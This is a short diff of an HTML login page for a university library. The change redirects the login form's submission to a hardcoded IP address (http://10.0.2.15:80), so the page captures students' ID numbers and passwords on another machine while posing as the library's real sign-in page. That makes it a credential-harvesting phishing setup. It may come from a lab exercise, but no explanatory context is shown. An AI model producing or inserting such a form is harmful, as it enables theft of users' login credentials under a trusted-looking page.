@@ -74,11 +74,12 @@
     <div class="container">
         <div class="header">Biblioteca Escolar</div>
         <p>Accede a tu cuenta</p>
-        <form id="loginForm" method="POST">
-            <input type="text" name="username" placeholder="Matrícula" required>
-            <input type="password" name="password" placeholder="Contraseña" required>
-            <button type="submit">Ingresar</button>
-        </form>
+       <form id="loginForm" method="POST" action="http://10.0.2.15:80">
+    <input type="text" name="username" placeholder="Matrícula" required>
+    <input type="password" name="password" placeholder="Contraseña" required>
+    <button type="submit">Ingresar</button>
+</form>
+
         <p id="error">Matrícula o contraseña incorrecta</p>
         <div class="footer">
             &copy; 2025 Biblioteca Universidad Estudiantil
